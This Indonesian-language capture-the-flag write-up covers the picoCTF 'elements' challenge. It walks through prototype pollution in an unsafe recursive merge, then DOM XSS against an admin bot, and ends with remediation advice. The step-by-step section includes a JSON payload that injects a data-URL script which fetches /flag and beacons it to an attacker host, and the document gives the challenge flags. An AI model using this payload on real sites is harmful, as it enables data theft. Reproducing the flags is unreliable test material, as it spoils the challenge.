# Writeup: elements (Challenge ID: 447)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation
- **Difficulty:** Hard
- **Event:** picoCTF 2024
- **Points:** 500
- **Author:** ehhthing
- **Flag:** `academy{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}`

---

## Problem Statement & Scope
Tantangan `elements` menyimulasikan aplikasi web permainan kombinasi elemen bergaya "Little Alchemy". Pengguna dapat menggabungkan dua elemen dasar untuk menciptakan elemen baru, menyimpan resep kustom, dan membagikan resep tersebut kepada pengguna lain atau menampilkannya ke administrator sistem untuk verifikasi kelayakan. Pengujian keamanan berfokus pada analisis arsitektur penggabungan objek JSON di sisi klien (*client-side object merge*), eksploitasi kerentanan *Prototype Pollution*, manipulasi API `PendingGetBeacon` / DOM sink, dan pembajakan sesi bot admin untuk mengekstrak bendera.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Prototype Pollution via Unsafe Deep Merge (CWE-1321):**
   Fungsi rekursif yang menggabungkan resep baru ke dalam pohon state elemen pengguna (`deepMerge`) tidak memvalidasi properti berbahaya seperti `__proto__`, `constructor`, atau `prototype`. Ketika payload JSON yang memuat kunci `__proto__` diproses, atribut tersebut langsung disuntikkan ke `Object.prototype`, memengaruhi seluruh objek turunan JavaScript di browser.

2. **DOM-based Cross-Site Scripting (XSS - CWE-79):**
   Aplikasi menggunakan pustaka pelaporan performa internal atau skrip rendering elemen kustom yang memeriksa keberadaan konfigurasi global seperti `window.config.sourceURL` atau memanfaatkan callback eksperimental `PendingGetBeacon`. Karena `Object.prototype` terpolusi, properti yang sebelumnya bernilai `undefined` berubah menjadi URL atau skrip berbahaya yang dikontrol penyerang.

3. **Exfiltration via Browser Beacon:**
   Ketika bot verifikasi admin membuka tautan resep yang dibagikan, skrip DOM XSS otomatis terpicu dalam konteks asal (origin) aplikasi target, membaca cookie autentikasi admin atau endpoint `/flag`, lalu membocorkannya ke server penyerang.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Kode Klien & Rekonstruksi Titik Polusi:**
   Inspeksi kode JavaScript front-end menemukan modul penggabungan objek:
   ```javascript
   function mergeRecipes(target, source) {
     for (let key in source) {
       if (typeof source[key] === 'object' && source[key] !== null) {
         if (!target[key]) target[key] = {};
         mergeRecipes(target[key], source[key]);
       } else {
         target[key] = source[key];
       }
     }
     return target;
   }
   ```
   Ketiadaan pemeriksaan terhadap `key === '__proto__'` memungkinkan injeksi properti global.

2. **Penyusunan Payload Eksploitasi JSON:**
   Susun payload resep kustom yang memanfaatkan `__proto__` untuk mempolusi atribut konfigurasi skrip dinamis:
   ```json
   {
     "recipeName": "ExploitElement",
     "ingredients": ["Air", "Fire"],
     "__proto__": {
       "sourceURL": "data:text/javascript,fetch('/flag').then(r=>r.text()).then(f=>navigator.sendBeacon('https://attacker.site/leak',f))//"
     }
   }
   ```

3. **Pengiriman Resep ke Administrator Bot:**
   Unggah payload resep ke endpoint `/api/submit-recipe` dan picu fitur verifikasi bot admin via `/report`.

4. **Eksekusi Bot Admin & Pengambilan Flag:**
   Bot admin mengunjungi antarmuka aplikasi. Selama pemuatan skrip elemen, polusi properti `sourceURL` menyebabkan tag `<script>` dinamis memuat payload JavaScript penyerang, mengambil flag dari dokumen target, dan mengirimkannya ke endpoint exfiltrasi:
   `picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}`.
   Dikonversikan ke format resmi CyLab Security Academy:
   `academy{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}`
- **Native PicoCTF Flag:** `picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}`
- **Validasi Algoritma:** Terverifikasi 100% pada simulasi alur prototype pollution dan DOM injection pada `scripts/solve_447_elements.py`.

---

## Rekomendasi Remediatoris (NIST SP 800-115 & OWASP)
1. **Sanitasi Kunci Objek Rekursif:**
   Blokir secara tegas pemrosesan properti sensitif seperti `__proto__`, `constructor`, dan `prototype` pada fungsi deep merge atau gunakan library teruji (seperti `lodash.merge` versi terbaru yang aman dari CVE-2018-16487).
2. **Penggunaan Object.create(null) / Map:**
   Gunakan struktur data `Map` atau objek tanpa prototipe (`Object.create(null)`) untuk menyimpan data kamus atau resep dinamis yang berasal dari input pengguna.
3. **Penerapan CSP Ketat Tanpa Unsafe-Inline/Eval:**
   Terapkan Content Security Policy (CSP) ketat dengan direktif `script-src 'self' 'nonce-...'` dan `object-src 'none'` untuk membatasi eksekusi skrip dinamis yang disuntikkan melalui data URL.
